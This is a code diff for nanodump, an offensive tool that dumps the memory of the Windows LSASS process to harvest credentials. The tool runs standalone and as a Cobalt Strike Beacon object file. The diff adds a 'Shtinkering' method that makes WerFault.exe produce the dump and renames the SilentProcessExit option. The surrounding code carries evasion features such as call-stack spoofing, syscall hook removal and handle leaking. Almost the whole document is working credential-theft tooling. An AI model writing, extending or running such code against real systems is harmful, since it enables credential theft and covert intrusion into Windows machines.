@@ -28,14 +28,16 @@ void go(char* args, int length)
     BOOL           forked_lsass = FALSE;
     LPCSTR         seclogon_leak_remote_binary = NULL;
     BOOL           use_seclogon_duplicate;
-    BOOL           use_werfault;
-    LPCSTR         werfault_lsass;
+    BOOL           use_silent_process_exit;
+    LPCSTR         silent_process_exit;
+    BOOL           use_lsass_shtinkering;
     DWORD          spoof_callstack;
     PPROCESS_LIST  created_processes = NULL;
     HANDLE         hSnapshot = NULL;
     WCHAR          wcFilePath[MAX_PATH];
     UNICODE_STRING full_dump_path;
-    DWORD permissions = 0;
+    DWORD          permissions = 0;
+    DWORD          attributes = 0;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -58,8 +60,9 @@ void go(char* args, int length)
     seclogon_leak_remote_binary = BeaconDataExtract(&parser, NULL);
     use_seclogon_duplicate = (BOOL)BeaconDataInt(&parser);
     spoof_callstack = BeaconDataInt(&parser);
-    use_werfault = (BOOL)BeaconDataInt(&parser);
-    werfault_lsass = BeaconDataExtract(&parser, NULL);
+    use_silent_process_exit = (BOOL)BeaconDataInt(&parser);
+    silent_process_exit = BeaconDataExtract(&parser, NULL);
+    use_lsass_shtinkering = (BOOL)BeaconDataInt(&parser);
 
     remove_syscall_callback_hook();
 
@@ -85,15 +88,15 @@ void go(char* args, int length)
         return;
     }
 
-    if (use_werfault)
+    if (use_silent_process_exit)
     {
-        if (!create_folder(werfault_lsass))
+        if (!create_folder(silent_process_exit))
         {
-            PRINT_ERR("The folder \"%s\" is not valid.", werfault_lsass);
+            PRINT_ERR("The folder \"%s\" is not valid.", silent_process_exit);
             return;
         }
         // let the Windows Error Reporting process make the dump for us
-        werfault_silent_process_exit(lsass_pid, werfault_lsass);
+        werfault_silent_process_exit(lsass_pid, silent_process_exit);
         return;
     }
 
@@ -112,6 +115,7 @@ void go(char* args, int length)
             fork_lsass,
             snapshot_lsass,
             use_valid_sig,
+            use_lsass_shtinkering,
             use_seclogon_leak_local,
             lsass_pid,
             &created_processes);
@@ -151,6 +155,14 @@ void go(char* args, int length)
     {
         permissions = LSASS_CLONE_PERMISSIONS;
     }
+    else if (use_lsass_shtinkering)
+    {
+        permissions = LSASS_SHTINKERING_PERMISSIONS;
+    }
+
+    // LSASS Shtinkering needs the handle to be inheritable
+    if (use_lsass_shtinkering)
+        attributes |= OBJ_INHERIT;
 
     hProcess = obtain_lsass_handle(
         lsass_pid,
@@ -159,7 +171,9 @@ void go(char* args, int length)
         use_seclogon_duplicate,
         spoof_callstack,
         FALSE,
-        dump_path);
+        dump_path,
+        attributes);
+
     if (!hProcess)
         goto cleanup;
 
@@ -171,11 +185,12 @@ void go(char* args, int length)
     }
 
     // if malseclogon_leak was used, the handle does not have PROCESS_CREATE_PROCESS
-    if ((fork_lsass || snapshot_lsass) &&
+    if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering) &&
         (use_seclogon_leak_local || use_seclogon_leak_remote))
     {
         hProcess = make_handle_full_access(
-            hProcess);
+            hProcess,
+            attributes);
         if (!hProcess)
             goto cleanup;
     }
@@ -184,7 +199,8 @@ void go(char* args, int length)
     if (fork_lsass)
     {
         hProcess = fork_process(
-            hProcess);
+            hProcess,
+            attributes);
         if (!hProcess)
             goto cleanup;
         forked_lsass = TRUE;
@@ -274,7 +290,7 @@ cleanup:
 
 void usage(char* procname)
 {
-    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--werfault C:\\Windows\\Temp] [--fork] [--snapshot] [--getpid] [--help]", procname);
+    PRINT("usage: %s [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", procname);
     PRINT("Dumpfile options:");
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
@@ -294,8 +310,10 @@ void usage(char* procname)
     PRINT("            open a handle to " LSASS " using a fake calling stack");
 #endif
     PRINT("Let WerFault.exe (instead of nanodump) create the dump");
-    PRINT("    --werfault DUMP_FOLDER, -wf DUMP_FOLDER");
-    PRINT("            force WerFault.exe to dump " LSASS);
+    PRINT("    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER");
+    PRINT("            force WerFault.exe to dump " LSASS " via SilentProcessExit");
+    PRINT("    --shtinkering, -sk");
+    PRINT("            force WerFault.exe to dump " LSASS " via Shtinkering");
     PRINT("Avoid reading " LSASS " directly:");
     PRINT("    --fork, -f");
     PRINT("            fork the target process before dumping");
@@ -318,7 +336,7 @@ int main(int argc, char* argv[])
     BOOL           forked_lsass                   = FALSE;
     BOOL           snapshot_lsass                 = FALSE;
     BOOL           duplicate_handle               = FALSE;
-    LPCSTR         werfault_lsass                 = NULL;
+    LPCSTR         silent_process_exit            = NULL;
     LPCSTR         dump_path                      = NULL;
     BOOL           success                        = FALSE;
     BOOL           use_valid_sig                  = FALSE;
@@ -328,6 +346,7 @@ int main(int argc, char* argv[])
     BOOL           is_seclogon_leak_local_stage_2 = FALSE;
     LPCSTR         seclogon_leak_remote_binary    = NULL;
     BOOL           use_seclogon_duplicate         = FALSE;
+    BOOL           use_lsass_shtinkering          = FALSE;
     DWORD          spoof_callstack                = 0;
     HANDLE         hSnapshot                      = NULL;
     PPROCESS_LIST  created_processes              = NULL;
@@ -336,6 +355,8 @@ int main(int argc, char* argv[])
     DWORD          num_modes                      = 0;
     WCHAR          wcFilePath[MAX_PATH]           = { 0 };
     UNICODE_STRING full_dump_path                 = { 0 };
+    DWORD          attributes                     = 0;
+    BOOL           running_as_system              = FALSE;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -345,7 +366,7 @@ int main(int argc, char* argv[])
     dc.DumpMaxSize = 0;
 
 #ifdef _M_IX86
-    if(local_is_wow64())
+    if (local_is_wow64())
     {
         PRINT_ERR("Nanodump does not support WoW64");
         return 0;
@@ -437,18 +458,33 @@ int main(int argc, char* argv[])
         {
             is_seclogon_leak_local_stage_2 = TRUE;
         }
-        else if (!strncmp(argv[i], "-wf", 4) ||
-                 !strncmp(argv[i], "--werfault", 11))
+        else if (!strncmp(argv[i], "-spe", 5) ||
+                 !strncmp(argv[i], "--silent-process-exit", 22))
         {
             if (i + 1 >= argc)
             {
-                PRINT("missing --werfault value");
+                PRINT("missing --silent-process-exit value");
                 return 0;
             }
-            werfault_lsass = argv[++i];
-            if (!create_folder(werfault_lsass))
+            silent_process_exit = argv[++i];
+            if (!create_folder(silent_process_exit))
             {
-                PRINT("The folder \"%s\" is not valid.", werfault_lsass);
+                PRINT("The folder \"%s\" is not valid.", silent_process_exit);
+                return 0;
+            }
+        }
+        else if (!strncmp(argv[i], "-sk", 4) ||
+                 !strncmp(argv[i], "--shtinkering", 14))
+        {
+            use_lsass_shtinkering = TRUE;
+
+            success = is_current_user_system(&running_as_system);
+            if (!success)
+                goto cleanup;
+
+            if (!running_as_system)
+            {
+                PRINT_ERR("You must be SYSTEM to run the Shtinkering technique");
                 return 0;
             }
         }
@@ -503,13 +539,16 @@ int main(int argc, char* argv[])
         num_modes++;
     if (get_pid_and_leave)
         num_modes++;
-    if (werfault_lsass)
+    if (silent_process_exit)
+        num_modes++;
+    if (use_lsass_shtinkering)
         num_modes++;
     if (num_modes != 1)
     {
         PRINT("Only one of the following parameters must be provided:")
         PRINT(" --write: nanodump will create the dump");
-        PRINT(" --werfault: WerFault will create the dump");
+        PRINT(" --silent-process-exit: WerFault will create the dump via SilentProcessExit");
+        PRINT(" --shtinkering: WerFault will create the dump via Shtinkering");
         PRINT(" --getpid: get the PID of " LSASS);
         PRINT("Enter --help for more details");
         return 0;
@@ -518,18 +557,18 @@ int main(int argc, char* argv[])
     if (get_pid_and_leave &&
         (use_valid_sig || snapshot_lsass || fork_lsass ||
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
-         use_seclogon_leak_remote || duplicate_handle || werfault_lsass))
+         use_seclogon_leak_remote || duplicate_handle || silent_process_exit))
     {
         PRINT("The parameter --getpid is used alone");
         return 0;
     }
 
-    if (werfault_lsass &&
+    if (silent_process_exit &&
         (use_valid_sig || snapshot_lsass || fork_lsass ||
          use_seclogon_duplicate || spoof_callstack || use_seclogon_leak_local ||
          use_seclogon_leak_remote || duplicate_handle))
     {
-        PRINT("The parameter --werfault is used alone");
+        PRINT("The parameter --silent-process-exit is used alone");
         return 0;
     }
 
@@ -611,9 +650,33 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    if (use_seclogon_leak_local && !is_full_path(dump_path))
+    if (!use_lsass_shtinkering && use_seclogon_leak_local && !is_full_path(dump_path))
     {
-        PRINT("If --malseclogon-leak-local is being used, you need to provide the full path: %s", dump_path);
+        PRINT("If --seclogon-leak-local is being used, you need to provide the full path: %s", dump_path);
+        return 0;
+    }
+
+    if (use_lsass_shtinkering && use_seclogon_duplicate)
+    {
+        PRINT("The options --shtinkering and --seclogon-duplicate cannot be used together");
+        return 0;
+    }
+
+    if (use_lsass_shtinkering && fork_lsass)
+    {
+        PRINT("The options --shtinkering and --fork cannot be used together");
+        return 0;
+    }
+
+    if (use_lsass_shtinkering && snapshot_lsass)
+    {
+        PRINT("The options --shtinkering and --snapshot cannot be used together");
+        return 0;
+    }
+
+    if (use_lsass_shtinkering && use_valid_sig)
+    {
+        PRINT("The options --shtinkering and --valid cannot be used together");
         return 0;
     }
 
@@ -642,17 +705,17 @@ int main(int argc, char* argv[])
         return 0;
     }
 
-    if (werfault_lsass)
+    if (silent_process_exit)
     {
         // let the Windows Error Reporting process make the dump for us
-        werfault_silent_process_exit(lsass_pid, werfault_lsass);
+        werfault_silent_process_exit(lsass_pid, silent_process_exit);
         return 0;
     }
 
     if (use_seclogon_leak_local && !seclogon_leak_remote_binary)
         seclogon_leak_remote_binary = argv[0];
 
-    if (!is_seclogon_leak_local_stage_2)
+    if (!is_seclogon_leak_local_stage_2 && !use_lsass_shtinkering)
     {
         if (!create_file(&full_dump_path))
             goto cleanup;
@@ -666,6 +729,7 @@ int main(int argc, char* argv[])
             fork_lsass,
             snapshot_lsass,
             use_valid_sig,
+            use_lsass_shtinkering,
             use_seclogon_leak_local,
             lsass_pid,
             &created_processes);
@@ -702,6 +766,14 @@ int main(int argc, char* argv[])
     {
         permissions = LSASS_CLONE_PERMISSIONS;
     }
+    else if (use_lsass_shtinkering)
+    {
+        permissions = LSASS_SHTINKERING_PERMISSIONS;
+    }
+
+    // LSASS Shtinkering needs the handle to be inheritable
+    if (use_lsass_shtinkering)
+        attributes |= OBJ_INHERIT;
 
     hProcess = obtain_lsass_handle(
         lsass_pid,
@@ -710,7 +782,8 @@ int main(int argc, char* argv[])
         use_seclogon_duplicate,
         spoof_callstack,
         is_seclogon_leak_local_stage_2,
-        dump_path);
+        dump_path,
+        attributes);
     if (!hProcess)
         goto cleanup;
 
@@ -721,21 +794,32 @@ int main(int argc, char* argv[])
         goto cleanup;
     }
 
-    // if malseclogon_leak was used, the handle does not have PROCESS_CREATE_PROCESS
-    if ((fork_lsass || snapshot_lsass) &&
+    // fork and snapshot need PROCESS_CREATE_PROCESS
+    // shtinkering needs the handle to be inheritable
+    if ((fork_lsass || snapshot_lsass || use_lsass_shtinkering) &&
         (use_seclogon_leak_local || use_seclogon_leak_remote))
     {
         hProcess = make_handle_full_access(
-            hProcess);
+            hProcess,
+            attributes);
         if (!hProcess)
             goto cleanup;
+    }
+
+    if (use_lsass_shtinkering)
+    {
+        werfault_shtinkering(
+            lsass_pid,
+            hProcess);
+        goto cleanup;
     }
 
     // avoid reading LSASS directly by making a fork
     if (fork_lsass)
     {
         hProcess = fork_process(
-            hProcess);
+            hProcess,
+            attributes);
         if (!hProcess)
             goto cleanup;
         forked_lsass = TRUE;
@@ -1090,7 +1174,8 @@ BOOL NanoDumpPPL(VOID)
         FALSE,
         FALSE,
         FALSE,
-        dump_path);
+        dump_path,
+        0);
     if (!hProcess)
         goto cleanup;
 
